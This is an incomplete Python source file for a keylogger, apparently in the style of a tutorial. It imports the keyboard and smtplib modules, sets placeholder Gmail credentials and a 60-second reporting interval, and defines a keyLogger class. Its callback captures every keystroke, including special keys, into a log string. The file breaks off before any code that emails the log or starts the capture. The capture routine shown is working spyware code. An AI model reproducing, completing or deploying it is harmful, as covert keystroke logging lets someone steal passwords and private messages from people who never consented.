# Import needed modules
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

# initialize parameters
SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
EMAIL_PASSWORD = "thisisafakepassword"



class keyLogger():
    """

    """

    def __init__(self, time_interval, report_method="email"):
        # Pass SEND_REPORT_EVERY to tinm_interval
        self.time_interval = time_interval
        self.report_method = report_method

        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""

        # record start & end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()



    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "

            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # finally, add the key name to our global `self.log` variable
        self.log += name


